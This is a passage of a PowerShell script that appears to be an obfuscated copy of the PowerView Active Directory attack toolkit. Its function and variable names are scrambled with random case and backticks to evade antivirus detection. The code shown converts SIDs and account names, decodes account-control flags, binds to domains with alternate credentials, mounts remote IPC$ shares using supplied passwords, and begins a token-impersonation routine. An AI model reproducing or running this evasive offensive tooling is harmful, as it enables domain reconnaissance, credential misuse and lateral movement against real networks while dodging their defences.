                        ${Na`ME} = ${na`ME}.Trim()
                        ${vaL`UES} = ${vA`Lue}.split(',') | fORe`A`ch-Obj`E`CT { ${_}.Trim() }

                        

                        if (${P`sBO`UnDPAR`AmeTeRS}['OutputObject']) {
                            ${na`ME} = ${NA`ME}.Replace(' ', '')
                            ${i`NIObj`ECT}.${s`ecT`ION} | A`Dd-ME`Mb`er noTEpRo`p`E`Rty ${Na`ME} ${vA`lU`ES}
                        }
                        else {
                            ${I`NI`ObJeCT}[${S`ECt`ION}][${na`me}] = ${VAl`UES}
                        }
                    }
                }
                ${I`NI`OBJeCt}
            }
        }
    }

    END {
        
        ${MAPped`C`OmpUT`ERs}.Keys | r`em`ovE-rEmoTE`cOn`NectIoN
    }
}


function e`xpORt-pOWerVIE`Wc`Sv {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${tr`Ue}, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [System.Management.Automation.PSObject[]]
        ${I`N`PutoBj`eCT},

        [Parameter(Mandatory = ${TR`Ue}, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${P`ATH},

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        ${d`El`iMiTer} = ',',

        [Switch]
        ${a`p`penD}
    )

    BEGIN {
        ${O`UtPU`Tpa`TH} = [IO.Path]::GetFullPath(${Ps`BoUndp`A`RAMet`E`Rs}['Path'])
        ${ex`is`Ts} = [System.IO.File]::Exists(${Ou`TPU`TpaTh})

        
        ${M`UTEx} = NeW-o`B`j`EcT S`YsTeM.`T`hR`eADinG.mUtex ${f`ALsE},'CSVMutex'
        ${N`Ull} = ${M`U`TEx}.WaitOne()

        if (${P`SboUNd`P`ARAME`TERs}['Append']) {
            ${fI`le`MOdE} = [System.IO.FileMode]::Append
        }
        else {
            ${FI`leMo`dE} = [System.IO.FileMode]::Create
            ${Exi`S`Ts} = ${F`AlSe}
        }

        ${c`SvS`T`REaM} = n`EW-OBJE`CT iO`.F`ILesTRe`Am(${ou`T`p`UtPATH}, ${FiL`EMode}, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        ${c`sVWR`iTeR} = nEw-O`BJ`ect sYstEm.I`o.ST`R`E`AMWR`it`ER(${Cs`VSTrE`AM})
        ${Csvw`R`IteR}.AutoFlush = ${T`RUe}
    }

    PROCESS {
        ForEach (${eNt`RY} in ${i`NpU`T`obJeCT}) {
            ${O`BJEC`T`CsV} = con`VeR`Tt`O`-csV -InputObject ${e`NT`RY} -Delimiter ${d`ElImI`TEr} -NoTypeInformation

            if (-not ${Exi`S`Ts}) {
                
                ${OBj`ECtC`sv} | foRea`CH-o`B`J`Ect { ${CSVw`R`i`TeR}.WriteLine(${_}) }
                ${EXi`S`Ts} = ${tr`Ue}
            }
            else {
                
                ${OBje`c`TCsV}[1..(${O`BJECT`cSV}.Length-1)] | fOR`ea`c`H-OB`JECt { ${CsvW`RiT`ER}.WriteLine(${_}) }
            }
        }
    }

    END {
        ${MUt`Ex}.ReleaseMutex()
        ${C`svwR`iTER}.Dispose()
        ${cs`V`STrEAM}.Dispose()
    }
}


function r`EsOlvE`-iPADD`ReSS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COmpuTE`Rn`Ame} = ${e`NV`:CompUT`er`NaMe}
    )

    PROCESS {
        ForEach (${COm`P`UtEr} in ${c`oMp`U`TERNAme}) {
            try {
                @(([Net.Dns]::GetHostEntry(${C`O`mPUT`Er})).AddressList) | f`orEAc`h-O`BJeCT {
                    if (${_}.AddressFamily -eq 'InterNetwork') {
                        ${O`UT} = neW`-o`BJECT P`SO`BjECT
                        ${O`UT} | A`Dd-`mEmber noTE`PrOp`E`RTY 'ComputerName' ${cO`MPu`TEr}
                        ${O`UT} | ADd-`m`EMBeR No`TEPrOPe`RtY 'IPAddress' ${_}.IPAddressToString
                        ${O`Ut}
                    }
                }
            }
            catch {
                WR`iTe`-VERb`OSE "[Resolve-IPAddress] Could not resolve $Computer to an IP Address."
            }
        }
    }
}


function c`oNve`RTTo-`SId {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${t`RuE}, ValueFromPipeline = ${T`Rue}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Alias('Name', 'Identity')]
        [String[]]
        ${oB`JEct`NaMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`MA`in},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`RV`er},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eDenT`iAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${d`om`AIn`SeAR`Ch`Er`ArgumEnTs} = @{}
        if (${P`s`BoUNdp`ARa`meTERs}['Domain']) { ${DomaiNsE`Arc`HERA`Rg`UM`EntS}['Domain'] = ${d`OmAiN} }
        if (${Ps`Bo`U`NDPARAMEt`e`Rs}['Server']) { ${Do`Ma`insEarchera`RguMEN`Ts}['Server'] = ${S`erv`ER} }
        if (${pSbOunDPAR`A`MeTE`Rs}['Credential']) { ${dO`m`Ai`NsEarCHE`RaRgU`MEn`TS}['Credential'] = ${c`Red`EnTiaL} }
    }

    PROCESS {
        ForEach (${o`BJECT} in ${OBJ`eCtN`A`mE}) {
            ${Ob`jE`CT} = ${o`B`jeCt} -Replace '/','\'

            if (${psBo`U`N`D`PARA`metErs}['Credential']) {
                ${D`N} = c`ONverT-a`DNA`Me -Identity ${Obj`E`Ct} -OutputType 'DN' @DomainSearcherArguments
                if (${D`N}) {
                    ${uSe`R`Do`mAin} = ${dN}.SubString(${DN}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    ${USE`Rn`AME} = ${dN}.Split(',')[0].split('=')[1]

                    ${DoMains`Earc`H`e`RARgUM`e`N`TS}['Identity'] = ${US`E`RNAME}
                    ${DOMA`i`NS`Ea`RcHErArgUME`NtS}['Domain'] = ${UsEr`D`omain}
                    ${dO`maINsE`Ar`CHE`Ra`RgumentS}['Properties'] = 'objectsid'
                    G`ET`-dOmAiNO`B`je`Ct @DomainSearcherArguments | s`El`EcT-Ob`JECt -Expand o`BJEct`sid
                }
            }
            else {
                try {
                    if (${OBje`ct}.Contains('\')) {
                        ${Dom`A`in} = ${obJE`cT}.Split('\')[0]
                        ${oB`j`eCt} = ${OBJe`cT}.Split('\')[1]
                    }
                    elseif (-not ${psb`o`UnDP`AraMEtErs}['Domain']) {
                        ${Dom`AINs`EArC`H`Era`R`GUMEntS} = @{}
                        ${dOM`AIn} = (Get-D`Om`A`In @DomainSearcherArguments).Name
                    }

                    ${O`Bj} = (new-`obJE`cT s`y`sTem.sECuRit`Y.`prINcIPAL`.`NtA`cC`OuNt(${dOMa`iN}, ${O`BjE`ct}))
                    ${o`BJ}.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    wrITe`-VE`R`BOSE "[ConvertTo-SID] Error converting $Domain\$Object : $_"
                }
            }
        }
    }
}


function co`N`Ve`RTfrom-`SID {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${T`RUe}, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${tR`Ue})]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        ${O`Bj`ecTsID},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`mA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Ser`V`eR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`deNT`IaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${AdNAMEa`R`gUM`e`NTS} = @{}
        if (${pSbOuNDparAM`e`T`E`RS}['Domain']) { ${a`dnA`ME`ArGumeNtS}['Domain'] = ${do`mA`iN} }
        if (${p`SBouNdPA`R`AmeTeRs}['Server']) { ${A`dN`AME`ArGUME`NTS}['Server'] = ${sE`Rv`er} }
        if (${Ps`B`Ou`Ndp`ARame`TERs}['Credential']) { ${ADnA`mEArG`U`M`ENts}['Credential'] = ${CR`edEn`TiAl} }
    }

    PROCESS {
        ForEach (${TA`RgE`TSId} in ${ObJE`cT`sID}) {
            ${TA`RG`e`TsId} = ${Ta`RgET`s`ID}.trim('*')
            try {
                
                Switch (${tAR`ge`TSID}) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        Co`NvER`T`-adnAmE -Identity ${t`AR`geTSid} @ADNameArguments
                    }
                }
            }
            catch {
                WR`ITe`-VERb`OsE "[ConvertFrom-SID] Error converting SID '$TargetSid' : $_"
            }
        }
    }
}


function ConVeRT`-a`Dna`mE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${TR`UE}, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('Name', 'ObjectName')]
        [String[]]
        ${idenT`ity},

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        ${ou`T`PUtT`YPe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`RvER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDEN`TIaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${Na`mEt`YPeS} = @{
            'DN'                =   1  
            'Canonical'         =   2  
            'NT4'               =   3  
            'Display'           =   4  
            'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
            'GUID'              =   7  
            'Unknown'           =   8  
            'UPN'               =   9  
            'CanonicalEx'       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function I`N`VOKE-M`ethoD([__ComObject] ${O`BJEcT}, [String] ${meT`hOD}, ${pA`R`AmETERs}) {
            ${OU`TPut} = ${n`Ull}
            ${OUt`p`UT} = ${ob`jE`cT}.GetType().InvokeMember(${m`e`Thod}, 'InvokeMethod', ${nu`ll}, ${Ob`JE`CT}, ${pARA`Met`Ers})
            wri`Te-OUt`PUT ${OUt`puT}
        }

        function Get`-P`ROPerTY([__ComObject] ${ob`jECT}, [String] ${PRoP`ERTy}) {
            ${ObJe`Ct}.GetType().InvokeMember(${p`ROp`ERTy}, 'GetProperty', ${n`UlL}, ${Obje`CT}, ${Nu`Ll})
        }

        function s`Et-Prop`Erty([__ComObject] ${oB`jECT}, [String] ${prop`eR`TY}, ${pARAMe`T`E`Rs}) {
            [Void] ${ObJE`cT}.GetType().InvokeMember(${Pr`OPE`Rty}, 'SetProperty', ${NU`LL}, ${Obje`CT}, ${paR`A`MeTers})
        }

        
        if (${P`sbOu`NdP`AramE`TErS}['Server']) {
            ${AD`sIn`IT`TYPe} = 2
            ${IN`iT`NAme} = ${Ser`V`Er}
        }
        elseif (${pS`BO`U`NdPa`RAmEtErS}['Domain']) {
            ${ADSi`N`itT`YpE} = 1
            ${iNI`TNa`ME} = ${D`Om`AiN}
        }
        elseif (${PSbou`Nd`PaRaMEte`RS}['Credential']) {
            ${C`Red} = ${cRed`Ent`IaL}.GetNetworkCredential()
            ${AdSI`NI`TtY`pe} = 1
            ${IN`it`NAMe} = ${c`RED}.Domain
        }
        else {
            
            ${AdSi`Ni`TTy`pe} = 3
            ${In`I`TnAMe} = ${n`ULL}
        }
    }

    PROCESS {
        ForEach (${T`AR`gETIDE`NT`ity} in ${I`d`EntITy}) {
            if (-not ${PSboUnD`p`Ar`A`ME`TERS}['OutputType']) {
                if (${TAR`GeTIDenti`Ty} -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    ${aDS`OUTpuT`TYpE} = ${N`AM`etYpEs}['DomainSimple']
                }
                else {
                    ${a`d`sou`TPU`TtyPe} = ${naME`TY`PeS}['NT4']
                }
            }
            else {
                ${adSOU`T`puT`T`YPE} = ${NaM`Ety`PEs}[${O`UT`PUtT`yPE}]
            }

            ${T`Ran`sLaTe} = NE`w-O`BjecT -ComObject nAme`Tr`A`NsLaTE

            if (${Psb`OunD`PA`RA`MeterS}['Credential']) {
                try {
                    ${c`ReD} = ${cReDEn`T`i`Al}.GetNetworkCredential()

                    i`N`VoKE-m`eThOD ${t`RaNSlA`TE} 'InitEx' (
                        ${aD`SinItt`ype},
                        ${iNiTn`A`ME},
                        ${C`ReD}.UserName,
                        ${cr`ED}.Domain,
                        ${cr`eD}.Password
                    )
                }
                catch {
                    WritE-`VERBo`se "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                }
            }
            else {
                try {
                    ${n`ULl} = iN`VO`ke-mET`HOd ${tra`N`sl`ATe} 'Init' (
                        ${a`DSinITT`YPE},
                        ${iN`I`TNAmE}
                    )
                }
                catch {
                    W`RIt`e-Ve`RBO`sE "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                }
            }

            
            SEt`-pRO`pErty ${t`Ra`NsLAte} 'ChaseReferral' (0x60)

            try {
                
                ${N`ULL} = i`N`VoKe`-`MetHOD ${t`RANsl`Ate} 'Set' (8, ${T`A`RGeT`iD`ENTitY})
                InVOk`e-m`etHOD ${traN`sLA`TE} 'Get' (${aDSoUt`PU`T`TYpE})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                w`RIte-`Ve`R`BOsE "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function c`OnvErtfrOm-`Ua`cValue {


    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${T`RUe}, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${T`Rue})]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        ${V`AlUe},

        [Switch]
        ${S`hOwa`Ll}
    )

    BEGIN {
        
        ${UaCV`AL`UES} = Ne`W-ob`JEcT SYs`TeM`.`COLLEcTIO`NS.S`PecIalI`zE`d.OR`d`eREd`d`ICtioNA`RY
        ${ua`cv`ALUes}.Add("SCRIPT", 1)
        ${U`Ac`VAlU`Es}.Add("ACCOUNTDISABLE", 2)
        ${uaCv`A`LuES}.Add("HOMEDIR_REQUIRED", 8)
        ${uAcvA`l`U`eS}.Add("LOCKOUT", 16)
        ${uACVa`lu`es}.Add("PASSWD_NOTREQD", 32)
        ${u`A`CvaLuEs}.Add("PASSWD_CANT_CHANGE", 64)
        ${ua`CValu`eS}.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        ${u`AcVa`lUeS}.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        ${uacVA`l`UEs}.Add("NORMAL_ACCOUNT", 512)
        ${u`AcV`AluEs}.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        ${uaC`VAl`UES}.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        ${U`Acv`ALUEs}.Add("SERVER_TRUST_ACCOUNT", 8192)
        ${uACvA`lu`ES}.Add("DONT_EXPIRE_PASSWORD", 65536)
        ${U`ACV`ALUeS}.Add("MNS_LOGON_ACCOUNT", 131072)
        ${UAcvA`LU`Es}.Add("SMARTCARD_REQUIRED", 262144)
        ${UA`cv`AluES}.Add("TRUSTED_FOR_DELEGATION", 524288)
        ${u`A`C`VALUES}.Add("NOT_DELEGATED", 1048576)
        ${UAcv`AL`Ues}.Add("USE_DES_KEY_ONLY", 2097152)
        ${uA`CVaL`Ues}.Add("DONT_REQ_PREAUTH", 4194304)
        ${ua`Cv`A`LUES}.Add("PASSWORD_EXPIRED", 8388608)
        ${U`Ac`VAlUes}.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        ${Ua`CV`ALUeS}.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        ${r`e`SuLtU`AcvAlueS} = nEw-O`Bj`E`ct sYS`TEM.Co`lleCTiOns.sPEci`A`liz`Ed`.orDERedDICTi`oNARY

        if (${SHO`wa`Ll}) {
            ForEach (${uAC`V`ALuE} in ${UAc`VAl`UES}.GetEnumerator()) {
                if ( (${vA`l`Ue} -band ${u`Ac`Value}.Value) -eq ${U`ACVaLuE}.Value) {
                    ${rEsUl`Tu`A`cVa`lues}.Add(${u`Ac`Val`Ue}.Name, "$($UACValue.Value)+")
                }
                else {
                    ${reSUltu`AC`VA`L`Ues}.Add(${uaC`VA`LUe}.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach (${UACV`AL`Ue} in ${Uac`VAL`Ues}.GetEnumerator()) {
                if ( (${VA`L`Ue} -band ${U`ACva`l`UE}.Value) -eq ${uACv`AlUE}.Value) {
                    ${RE`s`UlTuacVaL`UEs}.Add(${uAc`VA`LuE}.Name, "$($UACValue.Value)")
                }
            }
        }
        ${RE`Sul`TUAcv`ALu`ES}
    }
}


function get-P`RiNcIp`Al`ConT`e`XT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${t`RuE})]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        ${IDeNT`itY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`M`AIN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Reden`TI`Al} = [Management.Automation.PSCredential]::Empty
    )

    aDd-`Ty`pe -AssemblyName sysTem`.DIrECTOryS`ervICEs`.a`Cc`ouNt`MaNAGe`MEnT

    try {
        if (${psboU`NdPA`RAmEt`Ers}['Domain'] -or (${IDen`TI`TY} -match '.+\\.+')) {
            if (${iDE`NTI`TY} -match '.+\\.+') {
                
                ${cOnv`ErTEdI`D`e`NtiTy} = ${iD`en`TITy} | CoNVERt-adN`A`mE -OutputType CaNONIC`AL
                if (${ConveRTE`d`ide`NTItY}) {
                    ${c`OnN`ect`TARG`ET} = ${C`o`NVeR`Te`dIdEn`TiTy}.SubString(0, ${coNve`R`TeDID`E`NTiTy}.IndexOf('/'))
                    ${OB`Je`CTiD`eNt`ITy} = ${I`d`ENTItY}.Split('\')[1]
                    writ`E-Ve`Rb`Ose "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
                }
            }
            else {
                ${OBjec`Ti`DENTitY} = ${i`de`NTiTy}
                w`R`iTe-V`ErBo`se "[Get-PrincipalContext] Binding to domain '$Domain'"
                ${CONN`ectT`A`R`get} = ${dom`Ain}
            }

            if (${psBOuNdPar`AM`E`TERs}['Credential']) {
                Writ`E-`VERb`ose '[Get-PrincipalContext] Using alternate credentials'
                ${cOnT`E`XT} = N`EW-Obj`e`cT -TypeName SysT`em`.`dIrE`cToRYser`Vi`c`eS.ACcOU`N`TM`A`NaGEMeNT.`pRINciPaLcOntExT -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${C`O`NN`e`ctTArgET}, ${CRed`eN`TiAl}.UserName, ${crEd`e`NTIAL}.GetNetworkCredential().Password)
            }
            else {
                ${C`oN`TeXt} = n`eW-OBJ`ECt -TypeName systeM.D`IREc`To`R`YserVi`C`eS`.acCoU`Ntm`AN`AGEMEnt`.PRin`ciP`ALCO`NtE`Xt -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${coNnECTt`ArG`eT})
            }
        }
        else {
            if (${pSBOu`Ndpa`RamE`TErS}['Credential']) {
                Wri`T`E-vE`RBo`Se '[Get-PrincipalContext] Using alternate credentials'
                ${DOM`AiN`NaMe} = gET-DoM`A`In | sE`LE`Ct-obJeCt -ExpandProperty NA`me
                ${Co`Nte`XT} = n`EW-`OBJ`Ect -TypeName sYs`T`e`M.DIrE`C`TOryS`ervIce`S.accoU`NTm`A`NaGEMEN`T.PRinciP`Alc`Ont`E`xT -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${DomAI`N`N`AMe}, ${CRe`DE`NT`ial}.UserName, ${C`Re`dENTi`AL}.GetNetworkCredential().Password)
            }
            else {
                ${c`O`NTeXT} = New-`o`BJ`EcT -TypeName Sy`sTEM.dI`Re`c`TorYs`erV`i`C`E`S.ACCoUntMaNA`Ge`m`eNT.`P`RINcIP`AlC`on`Text -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            ${OBJect`ID`eN`Ti`Ty} = ${I`D`entitY}
        }

        ${o`UT} = nEw-`oB`jECT ps`OBJ`Ect
        ${O`UT} | ADD`-M`EM`Ber not`ePr`OpErty 'Context' ${C`ont`EXt}
        ${o`UT} | A`Dd`-M`EmbEr n`OtEpR`O`perTy 'Identity' ${O`B`j`EcTIDEN`TItY}
        ${o`UT}
    }
    catch {
        Writ`e`-WARNiNG "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
    }
}


function AdD`-ReMo`TE`cOn`N`ectiOn {


    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = ${t`RUE}, ParameterSetName = 'ComputerName', ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`oM`puT`ERName},

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = ${tR`Ue})]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        ${P`Ath},

        [Parameter(Mandatory = ${tR`Ue})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREdeNT`i`Al}
    )

    BEGIN {
        ${NE`Tre`soU`Rc`E`iNsTaNce} = [Activator]::CreateInstance(${nE`TRe`So`Urcew})
        ${NEtRES`o`UrcEiNStAn`ce}.dwType = 1
    }

    PROCESS {
        ${p`AT`HS} = @()
        if (${P`sbounDPa`RAMe`T`ers}['ComputerName']) {
            ForEach (${t`A`RGetcOmpUTErNA`mE} in ${Co`MP`UTEr`NAme}) {
                ${TargeT`C`OMp`UtErnaME} = ${t`ArGEtcoMp`U`T`ErNaME}.Trim('\')
                ${P`A`ThS} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${P`AtHs} += ,${Pa`TH}
        }

        ForEach (${taR`gEtp`ATh} in ${Pa`THS}) {
            ${Ne`Tre`S`oUr`Ce`InsTANCE}.lpRemoteName = ${t`ARGE`TPATH}
            W`RiT`e-VeRbO`se "[Add-RemoteConnection] Attempting to mount: $TargetPath"

            
            
            ${reSU`LT} = ${m`pr}::WNetAddConnection2W(${Net`RESOurCe`i`NS`Ta`N`Ce}, ${cr`EDe`NtIAL}.GetNetworkCredential().Password, ${c`RE`DE`NTIaL}.UserName, 4)

            if (${r`eS`ULT} -eq 0) {
                writE-`VeR`BoSE "$TargetPath successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function remove-Re`MotECoNn`ECt`ion {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = ${tr`UE}, ParameterSetName = 'ComputerName', ValueFromPipeline = ${t`RuE}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coMp`UT`ernAME},

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = ${T`RuE})]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        ${P`ATH}
    )

    PROCESS {
        ${p`AThS} = @()
        if (${pS`B`ouNDPA`R`A`METerS}['ComputerName']) {
            ForEach (${t`A`RGETC`OM`puTeRN`AMe} in ${Comp`UT`e`RN`AME}) {
                ${TaRgEtC`Om`p`UteRnaMe} = ${Ta`R`GEtCOmpuTeRN`AMe}.Trim('\')
                ${PA`T`hs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${P`AthS} += ,${pa`TH}
        }

        ForEach (${t`ARGetp`A`Th} in ${PAt`hs}) {
            wr`Ite-verBo`se "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
            ${RESu`Lt} = ${M`PR}::WNetCancelConnection2(${TArGe`TP`ATh}, 0, ${TR`UE})

            if (${resu`LT} -eq 0) {
                WR`I`T`e-`VerbOSE "$TargetPath successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function I`NvO`ke-UseRIM`pERsON`A`TIOn {


    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = ${t`RuE}, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`EdEnt`iAL},

        [Parameter(Mandatory = ${T`RuE}, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        ${to`K`ENhaNd`Le},

        [Switch]
        ${qU`iEt}
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not ${pSBOundpAr`AM`E`Ters}['Quiet'])) {
        WR`ItE-`waRNing "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if (${P`sbO`UNDp`Ar`Am`etERs}['TokenHandle']) {
        ${LogoN`Tok`en`haNDlE} = ${to`KEnH`A`Ndle}
    }
    else {
        ${LOG`ont`O`kEnha`Nd`lE} = [IntPtr]::Zero
